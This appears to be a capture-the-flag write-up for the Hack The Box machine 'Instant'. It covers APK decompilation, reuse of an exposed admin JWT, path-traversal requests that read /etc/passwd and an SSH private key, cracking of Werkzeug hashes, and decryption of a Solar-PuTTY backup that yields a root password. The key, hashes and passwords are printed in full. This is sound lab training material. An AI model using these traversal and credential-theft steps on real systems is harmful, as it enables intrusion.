---
title: "Instant"
tags:
    - machine
    - apk
date: "2025-03-01"
thumbnail: "/assets/img/thumbnail/Instant.png"
bookmark: true
---

# Description
---

<img src="/assets/img/thumbnail/Instant.png" alt="Instant">

# Solution
---
## Recon
---

Applying nmap scan

```bash
# Nmap 7.94SVN scan initiated Sun Oct 13 09:01:29 2024 as: nmap -sV -sC -Pn -p 22,80 -oA instant 10.129.192.33
Nmap scan report for instant.htb (10.129.192.33)
Host is up (0.094s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
|_  256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Instant Wallet
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct 13 09:01:43 2024 -- 1 IP address (1 host up) scanned in 14.43 seconds
```

## Shell as shirohige
---

Adding `instant.htb` to `/etc/hosts` and let's visit it.
After visiting we find this page.
<img src="/assets/img/htb/instant/1.png" alt="download page">
We can download a file which is `instant.apk`
to open an apk file we use `Jadx-GUI`
<img src="/assets/img/htb/instant/2.png" alt="apk">

When we navigate the android manifest to get a bird's eye view of the app we find we have many activities.
<img src="/assets/img/htb/instant/3.png" alt="manifest">

There are many interesting info we find like We got many API endpoints routes, so i tried to search using the hostname to get all the possible endpoints.
<img src="/assets/img/htb/instant/4.png" alt="endpoints">

We have 2 subdomains: `mywalletv1.instant.htb` & `swagger-ui.instant.htb`
also we have an exposed JWT token within `AdminActivities` and in other users you the JWT token used for authorization is got from shared_pref.

Let's visit swagger-ui subdomain as it will give us the doc of the API and we will be able to know what we can do.
<img src="/assets/img/htb/instant/5.png" alt="swagger">

When we try to visit `/api/v1/view/profile` we get this response
```json
{"Description":"Unauthorized!","Status":401}
```
So we need a method for authorization and we know what to do from what we saw in the activity implementation
we need to add the JWT as the value of authorization header and we have the JWT of the admin is exposed, so let's use it.
The response:
```json
{
    "Profile":
        {"account_status":"active",
        "email":"admin@instant.htb",
        "invite_token":"instant_admin_inv",
        "role":"Admin","username":"instantAdmin",
        "wallet_balance":"10000000",
        "wallet_id":"f0eca6e5-783a-471d-9d8f-0162cbc900db"},
    "Status":200}
```

Nice we can send requests as admin using that authorization header, now let's examine the API endpoints, I see that `/api/v1/admin/read/log` & `/api/v1/admin/view/logs` are very interesting as they are made for admin as we see.

For `/api/v1/admin/read/log` we need to send the path of the log file as value of `log_file_name` query parameter.
For `/api/v1/admin/view/logs` will list the available logs.

Let's list the log first using `/api/v1/admin/view/logs` 
```json
{
    "Files":[
        "1.log"
        ],
        "Path":"/home/shirohige/logs/",
        "Status":201
}
```

We have many exposed info from this
- The path underwhich it gets the logs
- the user is `shirohige`

now we can use `/api/v1/admin/read/log` and send the request to this `/api/v1/admin/read/log?log_file_name=1.log` and we will get
```json
{
    "/home/shirohige/logs/1.log":[
        "This is a sample log testing\n"
    ],
    "Status":201
    }
```

Trying LFI by sending request to `/api/v1/admin/read/log?log_file_name=../../../../../../etc/passwd` and GG
```json
{"/home/shirohige/logs/../../../../../../etc/passwd":["root:x:0:0:root:/root:/bin/bash\n","daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n","bin:x:2:2:bin:/bin:/usr/sbin/nologin\n","sys:x:3:3:sys:/dev:/usr/sbin/nologin\n","sync:x:4:65534:sync:/bin:/bin/sync\n","games:x:5:60:games:/usr/games:/usr/sbin/nologin\n","man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n","lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n","mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n","news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n","uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n","proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n","www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n","backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n","list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n","irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n","_apt:x:42:65534::/nonexistent:/usr/sbin/nologin\n","nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n","systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin\n","systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin\n","dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false\n","messagebus:x:101:102::/nonexistent:/usr/sbin/nologin\n","systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin\n","pollinate:x:102:1::/var/cache/pollinate:/bin/false\n","polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin\n","usbmux:x:103:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\n","sshd:x:104:65534::/run/sshd:/usr/sbin/nologin\n","shirohige:x:1001:1002:White Beard:/home/shirohige:/bin/bash\n","_laurel:x:999:990::/var/log/laurel:/bin/false\n"],"Status":201}
```

Actually we can read the flag now by sending the request to `/api/v1/admin/read/log?log_file_name=../user.txt`
but we want shell as shirohige, so let's get `.ssh/id_rsa` and the request will be to `/api/v1/admin/read/log?log_file_name=../.ssh/id_rsa` and we got the ssh private key file
```json
{"/home/shirohige/logs/../.ssh/id_rsa":["-----BEGIN OPENSSH PRIVATE KEY-----\n","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\n","-----END OPENSSH PRIVATE KEY-----\n"],"Status":201}
```

We can ask ChatGPT to rearrange the content for the desired format, then create the file and don't forget to `chmod 600 <private_key_file>`
then we can use it for ssh
```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/instant]
└─$ chmod 600 pri   
                                                                                                   
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/instant]
└─$ ssh shirohige@instant.htb -i pri

shirohige@instant:~$ ls
logs  projects  user.txt
```

## Shell as root
---
sudo -l didn't work as we don't have the password of the user

After some navigation in the web application files i found a file in this path `/home/shirohige/projects/mywallet/Instant-Api/mywallet/app.py`
in the flask app i found this
```python
app.config['SECRET_KEY'] = os.getenv("SECRET_KEY")
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///instant.db'
app.config['SQLALCHEMY_TRACK_MODIFICATION'] = True
```
There's a db file so let's get it

```bash
shirohige@instant:~/projects/mywallet/Instant-Api/mywallet$ find -name *.db 2>/dev/null
./instance/instant.db
```

Sending it to my machine for getting the candy
open it using `sqlite3 instant.db` then
```bash
sqlite> .tables
wallet_transactions  wallet_users         wallet_wallets     
sqlite> select * from wallet_users
   ...> ;
1|instantAdmin|admin@instant.htb|f0eca6e5-783a-471d-9d8f-0162cbc900db|pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978|2024-07-23 00:20:52.529887|87348|Admin|active
2|shirohige|shirohige@instant.htb|458715c9-b15e-467b-8a3d-97bc3fcf3c11|pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed|2024-08-08 20:57:47.909667|42845|instantian|active
```
We have 2 users and we got the hashes of them now.
After searching about the hash i found that it's called `Werkzeug password` and this <a href="https://github.com/AnataarXVI/Werkzeug-Cracker">tool</a> is the cracker of its hash.

One of the hashed got cracked.
```bash
┌──(youssif㉿youssif)-[~/Desktop/HTBMachines/instant/Werkzeug-Cracker]
└─$ python3 werkzeug_cracker.py -p ../hash.txt -w /usr/share/wordlists/rockyou.txt 
Countdown |                                | 105/14445389

Password found: estrella
```

This password doesn't work for root login or any other thing, so Let's keep it and keep moving.
After using `linpeas` i found interesting thing => we have `-rw-r--r-- 1 shirohige shirohige 1100 Sep 30 11:38 /opt/backups/Solar-PuTTY/sessions-backup.dat` this backup file.

I couldn't understand the content of that file, but after searching i found that it's solar-Putty session and this format is the encryption of that file and we will use this <a href="https://github.com/VoidSec/SolarPuttyDecrypt">tool</a> for decryption

In the usage of the tool we can do `SolarPuttyDecrypt.exe sessions-backup.dat ""` and empty quotes for no password passing, but it didn't work, so let's try the password we got before `SolarPuttyDecrypt.exe sessions-backup.dat "estrella"` and we got this output
```json
{
  "Sessions": [
    {
      "Id": "066894ee-635c-4578-86d0-d36d4838115b",
      "Ip": "10.10.11.37",
      "Port": 22,
      "ConnectionType": 1,
      "SessionName": "Instant",
      "Authentication": 0,
      "CredentialsID": "452ed919-530e-419b-b721-da76cbe8ed04",
      "AuthenticateScript": "00000000-0000-0000-0000-000000000000",
      "LastTimeOpen": "0001-01-01T00:00:00",
      "OpenCounter": 1,
      "SerialLine": null,
      "Speed": 0,
      "Color": "#FF176998",
      "TelnetConnectionWaitSeconds": 1,
      "LoggingEnabled": false,
      "RemoteDirectory": ""
    }
  ],
  "Credentials": [
    {
      "Id": "452ed919-530e-419b-b721-da76cbe8ed04",
      "CredentialsName": "instant-root",
      "Username": "root",
      "Password": "12**24nzC!r0c%q12",
      "PrivateKeyPath": "",
      "Passphrase": "",
      "PrivateKeyContent": null
    }
  ],
  "AuthScript": [],
  "Groups": [],
  "Tunnels": [],
  "LogsFolderDestination": "C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\SessionLogs"
}
```

We not have a password `12**24nzC!r0c%q12` let's try it in root login
```bash
shirohige@instant:/tmp$ su -
Password: 
root@instant:~# ls
root.txt
```
and GG !!
Hope u enjoyed the writeup.
